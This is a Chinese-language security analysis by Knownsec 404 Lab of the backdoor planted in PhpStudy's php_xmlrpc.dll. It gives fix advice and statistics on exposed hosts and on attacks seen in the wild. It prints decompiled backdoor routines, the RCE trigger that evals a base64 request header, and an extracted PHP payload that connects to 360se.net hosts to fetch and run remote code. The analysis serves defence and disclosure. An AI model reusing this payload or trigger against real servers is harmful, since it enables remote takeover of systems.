**作者：Hcamael@知道创宇404实验室  
时间：2019年9月26日**

### 背景介绍

2019/09/20，一则杭州警方通报打击涉网违法犯罪专项行动战果的新闻出现在我的朋友圈，其中通报了警方发现PhpStudy软件被种入后门后进行的侦查和逮捕了犯罪嫌疑人的事情。用PhpStudy的Web狗还挺多的，曾经我还是Web狗的时候也用过几天，不过因为不习惯就卸了。还记得当初会用PhpStudy的原因是在网上自学一些Web方向的课程时，那些课程中就是使用PhpStudy。在拿到样本后，我就对PhpStudy中的后门进行了一波逆向分析。

### 后门分析

最近关于讲phpstudy的文章很多，不过我只得到一个信息，后门在php_xmlrpc.dll文件中，有关键词："eval(%s(%s))"。得知这个信息后，就降低了前期的工作难度。可以直接对该dll文件进行逆向分析。

我拿到的是2018 phpstudy的样本: `MD5 (php_xmlrpc.dll) =
c339482fd2b233fb0a555b629c0ea5d5`

对字符串进行搜索，很容易的搜到了函数：`sub_100031F0`

经过对该函数逆向分析，发现该后门可以分为三种形式：

#### 1.触发固定payload：

    
    
    v12 = strcmp(**v34, aCompressGzip);
          if ( !v12 )
          {
            v13 = &rce_cmd;
            v14 = (char *)&unk_1000D66C;
            v42 = &rce_cmd;
            v15 = &unk_1000D66C;
            while ( 1 )
            {
              if ( *v15 == '\'' )
              {
                v13[v12] = '\\';
                v42[v12 + 1] = *v14;
                v12 += 2;
                v15 += 2;
              }
              else
              {
                v13[v12++] = *v14;
                ++v15;
              }
              v14 += 4;
              if ( (signed int)v14 >= (signed int)&unk_1000E5C4 )
                break;
              v13 = v42;
            }
            spprintf(&v36, 0, aVSMS, byte_100127B8, Dest);
            spprintf(&v42, 0, aSEvalSS, v36, aGzuncompress, v42);
            v16 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
            v17 = *(void **)(v16 + 296);
            *(_DWORD *)(v16 + 296) = &v32;
            v40 = v17;
            v18 = setjmp3((int)&v32, 0);
            v19 = v40;
            if ( v18 )
            {
              v20 = a3;
              *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v40;
            }
            else
            {
              v20 = a3;
              zend_eval_string(v42, 0, &rce_cmd, a3);
            }
            result = 0;
            *(_DWORD *)(*(_DWORD *)(*v20 + 4 * executor_globals_id - 4) + 296) = v19;
            return result;
          }

从`unk_1000D66C`到`unk_1000E5C4`为zlib压缩的payload，后门检查请求头，当满足要求后，会获取压缩后的payload，然后执行`@eval(gzuncompress(payload))`，把payload解压后再执行，经过提取，该payload为：

    
    
    @ini_set("display_errors","0");
    error_reporting(0);
    function tcpGet($sendMsg = '', $ip = '360se.net', $port = '20123'){
     $result = "";
      $handle = stream_socket_client("tcp://{$ip}:{$port}", $errno, $errstr,10); 
      if( !$handle ){
        $handle = fsockopen($ip, intval($port), $errno, $errstr, 5);
     if( !$handle ){
      return "err";
     }
      }
      fwrite($handle, $sendMsg."\n");
     while(!feof($handle)){
      stream_set_timeout($handle, 2);
      $result .= fread($handle, 1024);
      $info = stream_get_meta_data($handle);
      if ($info['timed_out']) {
        break;
      }
      }
      fclose($handle); 
      return $result; 
    }
    
    $ds = array("www","bbs","cms","down","up","file","ftp");
    $ps = array("20123","40125","8080","80","53");
    $n = false;
    do {
     $n = false;
     foreach ($ds as $d){
      $b = false;
      foreach ($ps as $p){
       $result = tcpGet($i,$d.".360se.net",$p); 
       if ($result != "err"){
        $b =true;
        break;
       }
      }
      if ($b)break;
     }
     $info = explode("<^>",$result);
     if (count($info)==4){
      if (strpos($info[3],"/*Onemore*/") !== false){
       $info[3] = str_replace("/*Onemore*/","",$info[3]);
       $n=true;
      }
      @eval(base64_decode($info[3]));
     }
    }while($n);

#### 2.触发固定的payload2

    
    
    if ( dword_10012AB0 - dword_10012AA0 >= dword_1000D010 && dword_10012AB0 - dword_10012AA0 < 6000 )
      {
        if ( strlen(byte_100127B8) == 0 )
          sub_10004480(byte_100127B8);
        if ( strlen(Dest) == 0 )
          sub_10004380(Dest);
        if ( strlen(byte_100127EC) == 0 )
          sub_100044E0(byte_100127EC);
        v8 = &rce_cmd;
        v9 = asc_1000D028;
        v41 = &rce_cmd;
        v10 = 0;
        v11 = asc_1000D028;
        while ( 1 )
        {
          if ( *(_DWORD *)v11 == '\'' )
          {
            v8[v10] = 92;
            v41[v10 + 1] = *v9;
            v10 += 2;
            v11 += 8;
          }
          else
          {
            v8[v10++] = *v9;
            v11 += 4;
          }
          v9 += 4;
          if ( (signed int)v9 >= (signed int)&unk_1000D66C )
            break;
          v8 = v41;
        }
        spprintf(&v41, 0, aEvalSS, aGzuncompress, v41);
        v22 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
        v23 = *(_DWORD *)(v22 + 296);
        *(_DWORD *)(v22 + 296) = &v31;
        v38 = v23;
        v24 = setjmp3((int)&v31, 0);
        v25 = v38;
        if ( v24 )
        {
          v26 = a3;
          *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v38;
        }
        else
        {
          v26 = a3;
          zend_eval_string(v41, 0, &rce_cmd, a3);
        }
        *(_DWORD *)(*(_DWORD *)(*v26 + 4 * executor_globals_id - 4) + 296) = v25;
        if ( dword_1000D010 < 3600 )
          dword_1000D010 += 3600;
        ftime(&dword_10012AA0);
      }
      ftime(&dword_10012AB0);
      if ( dword_10012AA0 < 0 )
        ftime(&dword_10012AA0);

当请求头里面不含有`Accept-Encoding`字段，并且时间戳满足一定条件后，会执行`asc_1000D028`到`unk_1000D66C`经过压缩的payload，同第一种情况。

提取后解压得到该payload：

    
    
    @ini_set("display_errors","0");
    error_reporting(0);
    $h = $_SERVER['HTTP_HOST'];
    $p = $_SERVER['SERVER_PORT'];
    $fp = fsockopen($h, $p, $errno, $errstr, 5);
    if (!$fp) {
    } else {
     $out = "GET {$_SERVER['SCRIPT_NAME']} HTTP/1.1\r\n";
     $out .= "Host: {$h}\r\n";
     $out .= "Accept-Encoding: compress,gzip\r\n";
     $out .= "Connection: Close\r\n\r\n";
    
     fwrite($fp, $out);
     fclose($fp);
    }

#### 3.RCE远程命令执行

    
    
    if ( !strcmp(**v34, aGzipDeflate) )
        {
          if ( zend_hash_find(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 216, aServer, strlen(aServer) + 1, &v39) != -1
            && zend_hash_find(**v39, aHttpAcceptChar, strlen(aHttpAcceptChar) + 1, &v37) != -1 )
          {
            v40 = base64_decode(**v37, strlen((const char *)**v37));
            if ( v40 )
            {
              v4 = *(_DWORD *)(*a3 + 4 * executor_globals_id - 4);
              v5 = *(_DWORD *)(v4 + 296);
              *(_DWORD *)(v4 + 296) = &v30;
              v35 = v5;
              v6 = setjmp3((int)&v30, 0);
              v7 = v35;
              if ( v6 )
                *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v35;
              else
                zend_eval_string(v40, 0, &rce_cmd, a3);
              *(_DWORD *)(*(_DWORD *)(*a3 + 4 * executor_globals_id - 4) + 296) = v7;
            }
          }

当请求头满足一定条件后，会提取一个请求头字段，进行base64解码，然后`zend_eval_string`执行解码后的exp。

研究了后门类型后，再来看看什么情况下会进入该函数触发该后门。查询`sub_100031F0`函数的引用信息发现：

    
    
    data:1000E5D4                 dd 0
    .data:1000E5D8                 dd 0
    .data:1000E5DC                 dd offset aXmlrpc       ; "xmlrpc"
    .data:1000E5E0                 dd offset off_1000B4B0
    .data:1000E5E4                 dd offset sub_10001010
    .data:1000E5E8                 dd 0
    .data:1000E5EC                 dd offset sub_100031F0
    .data:1000E5F0                 dd offset sub_10003710
    .data:1000E5F4                 dd offset sub_10001160
    .data:1000E5F8                 dd offset a051          ; "0.51"

该函数存在于一个结构体中，该结构体为`_zend_module_entry`结构体：

    
    
    //zend_modules.h
    struct _zend_module_entry {
        unsigned short size; //sizeof(zend_module_entry)
        unsigned int zend_api; //ZEND_MODULE_API_NO
        unsigned char zend_debug; //是否开启debug
        unsigned char zts; //是否开启线程安全
        const struct _zend_ini_entry *ini_entry;
        const struct _zend_module_dep *deps;
        const char *name; //扩展名称，不能重复
        const struct _zend_function_entry *functions; //扩展提供的内部函数列表
        int (*module_startup_func)(INIT_FUNC_ARGS); //扩展初始化回调函数，PHP_MINIT_FUNCTION或ZEND_MINIT_FUNCTION定义的函数
        int (*module_shutdown_func)(SHUTDOWN_FUNC_ARGS); //扩展关闭时回调函数
        int (*request_startup_func)(INIT_FUNC_ARGS); //请求开始前回调函数
        int (*request_shutdown_func)(SHUTDOWN_FUNC_ARGS); //请求结束时回调函数
        void (*info_func)(ZEND_MODULE_INFO_FUNC_ARGS); //php_info展示的扩展信息处理函数
        const char *version; //版本
        ...
        unsigned char type;
        void *handle;
        int module_number; //扩展的唯一编号
        const char *build_id;
    };

`sub_100031F0`函数为`request_startup_func`，该字段表示在请求初始化阶段回调的函数。从这里可以知道，只要php成功加载了存在后门的xmlrpc.dll，那么任何只要构造对应的后门请求头，那么就能触发后门。在Nginx服务器的情况下就算请求一个不存在的路径，也会触发该后门。

由于该后门存在于php的ext扩展中，所以不管是nginx还是apache还是IIS介受影响。

修复方案也很简单，把php的`php_xmlrpc.dll`替换成无后门的版本，或者现在直接去官网下载，官网现在的版本经检测都不存后门。

虽然又对后门的范围进行了一波研究，发现后门只存在于`php-5.4.45`和`php-5.2.17`两个版本中：

    
    
    $ grep "@eval" ./* -r
    Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
    Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches

随后又在第三方网站上(<https://www.php.cn/xiazai/gongju/89>)上下载了phpstudy2016，却发现不存在后门:

    
    
    phpStudy20161103.zip压缩包md5：5bf5f785f027bf0c99cd02692cf7c322
    phpStudy20161103.exe   md5码：1a16183868b865d67ebed2fc12e88467

之后同事又发了我一份他2018年在官网下载的phpstudy2016，发现同样存在后门，跟2018版的一样，只有两个版本的php存在后门：

    
    
    MD5 (phpStudy20161103_backdoor.exe) = a63ab7adb020a76f34b053db310be2e9
    $ grep "@eval" ./* -r
    Binary file ./php/php-5.4.45/ext/php_xmlrpc.dll matches
    Binary file ./php/php-5.2.17/ext/php_xmlrpc.dll matches

查看发现第三方网站上是于2017-02-13更新的phpstudy2016。

### ZoomEye数据

通过ZoomEye探测phpstudy可以使用以下dork：

  1. "Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.4.45" "Apache/2.4.23 (Win32) OpenSSL/1.0.2j PHP/5.2.17" +"X-Powered-By" -> 89,483
  2. +"nginx/1.11.5" +"PHP/5.2.17" -> 597 总量共计有90,080个目标现在可能会受到PhpStudy后门的影响。

可能受影响的目标全球分布概况：

![
](https://images.seebug.org/content/images/2019/09/a6e71197-53db-4098-bc97-5ab21b72cef3.png-w331s)

![
](https://images.seebug.org/content/images/2019/09/f5bfb5db-9b0f-4816-967a-0905e32dfa77.png-w331s)

可能受影响的目标全国分布概况：

![
](https://images.seebug.org/content/images/2019/09/88af7ec0-d782-4582-860a-51593fbf70ed.png-w331s)

![
](https://images.seebug.org/content/images/2019/09/cc68c2ee-65b0-417c-ad81-a303f26a0d61.png-w331s)

毕竟是国产软件，受影响最多的国家还是中国，其次是美国。对美国受影响的目标进行简单的探查发现基本都是属于IDC机房的机器，猜测都是国人在购买的vps上搭建的PhpStudy。

### 知道创宇云防御数据

知道创宇404积极防御团队检测到2019/09/24开始，互联网上有人开始对PhpStudy后门中的RCE进行利用。

2019/09/24攻击总数13320，攻击IP数110，被攻击网站数6570，以下是攻击来源TOP 20:

攻击来源 | 攻击次数  
---|---  
*.164.246.149 | 2251  
*.114.106.254 | 1829  
*.172.65.173 | 1561  
*.186.180.236 | 1476  
*.114.101.79 | 1355  
*.147.108.202 | 1167  
*.140.181.28 | 726  
*.12.203.223 | 476  
*.12.73.12 | 427  
*.12.183.161 | 297  
*.75.78.226 | 162  
*.12.184.173 | 143  
*.190.132.114 | 130  
*.86.46.71 | 126  
*.174.70.149 | 92  
*.167.156.78 | 91  
*.97.179.164 | 87  
*.95.235.26 | 83  
*.140.181.120 | 80  
*.114.105.176 | 76  
  
2019/09/25攻击总数45012，攻击IP数187，被攻击网站数10898，以下是攻击来源TOP 20:

攻击来源 | 攻击次数  
---|---  
*.114.101.79 | 6337  
*.241.157.69 | 5397  
*.186.180.236 | 5173  
*.186.174.48 | 4062  
*.37.87.81 | 3505  
*.232.241.237 | 2946  
*.114.102.5 | 2476  
*.162.20.54 | 2263  
*.157.96.89 | 1502  
*.40.8.29 | 1368  
*.94.10.195 | 1325  
*.186.41.2 | 1317  
*.114.102.69 | 1317  
*.114.106.254 | 734  
*.114.100.144 | 413  
*.114.107.73 | 384  
*.91.170.36 | 326  
*.100.96.67 | 185  
*.83.189.86 | 165  
*.21.136.203 | 149  
  
攻击源国家分布：

国家 | 数量  
---|---  
中国 | 34  
美国 | 1  
韩国 | 1  
德国 | 1  
  
省份分布：

省份 | 数量  
---|---  
云南 | 7  
北京 | 6  
江苏 | 6  
广东 | 4  
香港 | 4  
上海 | 2  
浙江 | 2  
重庆 | 1  
湖北 | 1  
四川 | 1  
  
攻击payload:

![
](https://images.seebug.org/content/images/2019/09/0efe14fc-c086-4fe4-87e0-6ffb492bff8b.png-w331s)

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1044/>

